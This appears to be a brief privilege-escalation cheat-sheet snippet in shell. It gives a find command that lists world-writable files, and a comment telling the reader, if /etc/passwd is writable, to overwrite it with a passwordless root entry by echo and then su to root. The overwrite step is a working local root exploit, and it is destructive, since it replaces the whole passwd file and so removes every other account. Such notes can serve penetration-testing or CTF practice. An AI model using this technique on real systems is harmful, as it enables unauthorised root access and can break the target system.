# find all files that are world writeable, irrespective of what other permissions they have, you can do:
# what files can you edit?
# is /etc/passwd there? if so "echo root::0:0:root:/root:/bin/bash > /etc/passwd" then do su to become root
find / -perm -o+w 2>/dev/null


